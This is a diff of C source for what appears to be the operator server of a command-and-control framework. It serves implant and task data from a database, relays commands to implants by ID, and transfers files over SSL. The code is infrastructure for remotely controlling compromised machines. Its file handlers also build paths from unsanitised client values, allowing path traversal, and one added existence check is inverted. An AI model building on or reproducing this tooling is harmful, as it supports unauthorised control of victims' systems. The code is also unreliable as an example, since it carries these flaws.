@@ -24,13 +24,10 @@
 #include <openssl/core_names.h> 
 #include <openssl/sslerr.h>
 
-#include "./cJSON/cJSON.h"
+//#include "./cJSON/cJSON.h"
 #include "db.h"
 #include "logs.h"
 #include "common.h"
-
-
-
 
 char USERNAME[0x100];
 
@@ -249,54 +246,29 @@ void *operator_handler(void *Args) {
             char *implants = GetData(con, "Implants");
             //printf("Caller \n%s\n---\n", implants);
 
-            if (!implants) {
-                log_message(LOG_ERROR, "Failed to get Implant data from database");
-                continue;
-            } 
-            /*
-            size_t len = strlen(implants);
-            if (len > 0 && implants[len-1] != '}') {
-                char *fixed_json = malloc(len + 2);
-                if (!fixed_json) {
-                    log_message(LOG_DEBUG, "Failed to allocate memory");
-                    continue;    
-                }
-                strcpy(fixed_json, implants);
-                fixed_json[len] = '}';
-                fixed_json[len + 1] = '\0';
-                free(implants); 
-                //printf("Fixed \n%s\n--", fixed_json);
-                cJSON *re = cJSON_Parse(fixed_json);
-                if (!re) {
-                    log_message(LOG_ERROR, "Invalid JSON FROM Implants database");
-                    free(fixed_json);
-                    continue;;
-                }
-                cJSON_Delete(re);
-                send_json(ssl, fixed_json);
-                free(fixed_json);
-            } else {
-                send_json(ssl, implants);
-                free(implants);
-            }*/
+            	if (!implants) {
+            	    	log_message(LOG_ERROR, "Failed to get Implant data from database");
+            	    	continue;
+            	} 
+
         send_json(ssl, implants);
         free(implants);
             
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
-            char *tasks = GetData(con, "Tasks");
-            if (tasks == NULL) {
-                continue;
-            }
-            //SSL_write(ssl, tasks, strlen(tasks));
-            send_json(ssl, tasks);
-            free(tasks);
+            	char *tasks = GetData(con, "Tasks");
+            	if (tasks == NULL) {
+            		continue;
+            	}
+            	//SSL_write(ssl, tasks, strlen(tasks));
+            	send_json(ssl, tasks);
+            	free(tasks);
         } else if (strcmp(about->valuestring, "implant_id") == 0) {
-            char *data = interact_with_implant(con, requested_info);
-            if (data == NULL) {
-                //send(sock, "ERROR", strlen("ERROR"), 0);
-                //SSL_write(ssl, reply_, sizeof("ERROR"));    
-                continue;
-            }
+            	char *data = interact_with_implant(con, requested_info);
+            	if (data == NULL) {
+            	    //send(sock, "ERROR", strlen("ERROR"), 0);
+            	    //SSL_write(ssl, reply_, sizeof("ERROR"));    
+			continue;
+            	}
             //send(sock, data, strlen(data), 0);
             //SSL_write(ssl, data, strlen(data));
             send_json(ssl, data);
@@ -340,7 +312,6 @@ void *operator_handler(void *Args) {
                 char *arr = cJSON_Print(list);
                 cJSON_Delete(list);
                 send_json(ssl, arr);
-                //SSL_write(ssl, arr, strlen(arr));
                 free(arr);
             }
         } else if (strcmp(about->valuestring, "Batch Tasks") == 0) {
@@ -370,129 +341,136 @@ void *operator_handler(void *Args) {
 
 int operator_file_download(SSL *ssl) {
     // check if folder exists
-    if (check_if_dir_exists("./uploads/operator/") == false) {
-        if (create_dir("./uploads/operator") == false) {
-            return -1;
-        }
-    }
-    char filename[BUFFER_SIZE];
-    SSL_read(ssl, filename, sizeof(filename) -1);
-    cJSON *get_filename = cJSON_Parse(filename);
-    if (!get_filename) {
-        log_message(LOG_ERROR, "Failed to ");
-        return -1;
-    }
+    	if (check_if_dir_exists("./uploads/operator/") == false) {
+    	    	if (create_dir("./uploads/operator") == false) {
+    	        	return -1;
+    		}
+    	}
+    	char filename[BUFFER_SIZE];
+    	SSL_read(ssl, filename, sizeof(filename) -1);
+    	cJSON *get_filename = cJSON_Parse(filename);
+    	if (!get_filename) {
+    	    	log_message(LOG_ERROR, "Failed to ");
+    	    	return -1;
+    	}
 
-    cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
-    //memset(filename, 0, sizeof(filename));
-    strncpy(filename, name->valuestring, sizeof(filename)-1);
-    log_message(LOG_INFO, "Receiving file with name : %s", filename);
-    cJSON_Delete(get_filename);
+    	cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
+    	//memset(filename, 0, sizeof(filename));
+    	strncpy(filename, name->valuestring, sizeof(filename)-1);
+    	log_message(LOG_INFO, "Receiving file with name : %s", filename);
+    	cJSON_Delete(get_filename);
 
-    char *contents = (char*)malloc(MAX_INFO);
-    char filepath[BUFFER_SIZE + 32]; // = "./uploads_operator";
-    
-    
-    snprintf(filepath, sizeof(filepath), "./uploads/operator/%s", filename);
+    	char *contents = (char*)malloc(MAX_INFO);
+    	char filepath[BUFFER_SIZE + 32];
 
-    int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
-    if (fd == -1) {
-        log_message(LOG_ERROR, "Failed to create file descriptor for : %s", filepath);
-        return -1;
-    }
 
-    log_message(LOG_INFO, "Writing to file : %s ", filepath);
-    size_t bytesRead;
-    size_t filesize;
-    SSL_read(ssl, &filesize, sizeof(filesize));
+    	snprintf(filepath, sizeof(filepath), "./uploads/operator/%s", filename);
 
-    size_t received = 0;
-    while (received < filesize) {
-        bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
-        write(fd, contents, bytesRead);
-        received += bytesRead;
-    }
+    	int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
+    	if (fd == -1) {
+    	    	log_message(LOG_ERROR, "Failed to create file descriptor for : %s", filepath);
+    	    	return -1;
+    	}
 
-    //while ((bytesRead = SSL_read(ssl, contents, FILE_CHUNK)) > 0) {
-    //    write(fd, contents, bytesRead);
-    //}
-    log_message(LOG_INFO, "Wrote data to file : %s ", filepath);
-    free(contents);
-    return 0;
+    	log_message(LOG_INFO, "Writing to file : %s ", filepath);
+    	size_t bytesRead;
+    	size_t filesize;
+    	SSL_read(ssl, &filesize, sizeof(filesize));
+
+    	size_t received = 0;
+    	while (received < filesize) {
+    	    	bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
+    	    	write(fd, contents, bytesRead);
+    	    	received += bytesRead;
+    	}
+
+    	log_message(LOG_INFO, "Wrote data to file : %s ", filepath);
+    	free(contents);
+    	return 0;
 }
 
 int operator_file_upload(SSL *ssl) {
 
-    char filename[BUFFER_SIZE];
-    //SSL_read(ssl, filename, sizeof(filename) -1);
-    char *buffer = recv_json(ssl);
-    if (!buffer) return -1;
-    cJSON *get_filename = cJSON_Parse(buffer);
-    if (!get_filename) {
-        log_message(LOG_ERROR, "Failed TO Parse JSON");
-        free(buffer);
-        return -1;
-    }
-    cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
-    strncpy(filename, name->valuestring, sizeof(filename)-1);
-    cJSON *dir = cJSON_GetObjectItem(get_filename, "dir");
+    	char filename[BUFFER_SIZE];
+    	//SSL_read(ssl, filename, sizeof(filename) -1);
+    	char *buffer = recv_json(ssl);
+    	if (!buffer) return -1;
+    	cJSON *get_filename = cJSON_Parse(buffer);
+    	if (!get_filename) {
+    	    	log_message(LOG_ERROR, "Failed TO Parse JSON");
+    	    	free(buffer);
+    	    	return -1;
+    	}
+    	cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
+    	strncpy(filename, name->valuestring, sizeof(filename)-1);
+    	cJSON *dir = cJSON_GetObjectItem(get_filename, "dir");
+
+	free(buffer);
+	cJSON_Delete(get_filename);
+
+    	char base_path[BUFFER_SIZE];
+    	snprintf(base_path, BUFFER_SIZE, "./uploads/%s", dir->valuestring);
+
+    	char filepath[BUFFER_SIZE * 2];
+    	snprintf(filepath, sizeof(filepath), "%s/%s", base_path, filename);
+
+
+    	char *contents = (char*)malloc(MAX_INFO);
+    	if (contents == NULL) {
+    	    	log_message(LOG_ERROR, "[Upload File] failed to allocate memory");
+    	    	return -1;
+    	}
+
+	if (!access(filepath, F_OK)) {
+		log_message(LOG_ERROR, "File %s Does Not Exist", filepath);
+		free(contents);
+		return -1;
+    	}
     
-    char base_path[BUFFER_SIZE];
-    snprintf(base_path, BUFFER_SIZE, "./uploads/%s", dir->valuestring);
 
-    char filepath[BUFFER_SIZE * 2];
-    snprintf(filepath, sizeof(filepath), "%s/%s", base_path, filename);
-
-
-    char *contents = (char*)malloc(MAX_INFO);
-    if (contents == NULL) {
-        log_message(LOG_ERROR, "[Upload File] failed to allocate memory");
-        return -1;
-    }
+    	int fd = open(filepath, O_RDONLY);
+    	if (fd == -1) {
+    	    	log_message(LOG_ERROR, "[Upload file] Failed to open File Fescriptor for : %s", filepath);
+    	    	free(contents);
+		return -1;
+    	}
 
     
 
-    int fd = open(filepath, O_RDONLY);
-    if (fd == -1) {
-        log_message(LOG_ERROR, "[Upload file] Failed to open File Fescriptor for : %s", filepath);
-        return -1;
-    }
+    	cJSON *dir_exists = cJSON_CreateObject();
+    	char *filepath_ = search_file(base_path, filename);
+    	if (filepath_ == NULL) {
+    	    	cJSON_AddBoolToObject(dir_exists, "Exist", false);
+    	    	char *exists = cJSON_Print(dir_exists);
+    	    	cJSON_Delete(dir_exists);
+    	    	//SSL_write(ssl, exists, strlen(exists));
+    	    	send_json(ssl, exists);
+    	    	free(exists);
+    	    	//log_message(LOG_ERROR, "File Does Not Exist filename - %s", filename);
+		free(contents);
+    	    	return -1;
+    	}
+    	cJSON_AddBoolToObject(dir_exists, "Exist", true);
 
+    	char *exists = cJSON_Print(dir_exists);
+    	cJSON_Delete(dir_exists);
+    	//SSL_write(ssl, exists, strlen(exists));
+    	send_json(ssl, exists);
+    	free(exists);
     
+    	log_message(LOG_INFO, "Uploading %s", filename);
 
-    cJSON *dir_exists = cJSON_CreateObject();
-    char *filepath_ = search_file(base_path, filename);
-    if (filepath_ == NULL) {
-        cJSON_AddBoolToObject(dir_exists, "Exist", false);
-        char *exists = cJSON_Print(dir_exists);
-        cJSON_Delete(dir_exists);
-        //SSL_write(ssl, exists, strlen(exists));
-        send_json(ssl, exists);
-        free(exists);
-        //log_message(LOG_ERROR, "File Does Not Exist filename - %s", filename);
-        return -1;
-    }
-    cJSON_AddBoolToObject(dir_exists, "Exist", true);
+    	// send file size
+    	struct stat st;
+    	fstat(fd, &st);
+    	size_t filesize = st.st_size;
+    	SSL_write(ssl, &filesize, sizeof(filesize));
+    	size_t bytesRead;
+    	while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
+		SSL_write(ssl, contents, bytesRead);
+    	}
 
-    char *exists = cJSON_Print(dir_exists);
-    cJSON_Delete(dir_exists);
-    //SSL_write(ssl, exists, strlen(exists));
-    send_json(ssl, exists);
-    free(exists);
-    
-    log_message(LOG_INFO, "Uploading %s", filename);
-
-    // send file size
-    struct stat st;
-    fstat(fd, &st);
-    size_t filesize = st.st_size;
-    SSL_write(ssl, &filesize, sizeof(filesize));
-    size_t bytesRead;
-    while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
-        SSL_write(ssl, contents, bytesRead);
-    }
-    
-    log_message(LOG_INFO, "Upload Completed");
-    free(contents);
-    return 0;
+    	log_message(LOG_INFO, "Upload Completed");
+    	free(contents);
+    	return 0;
 }
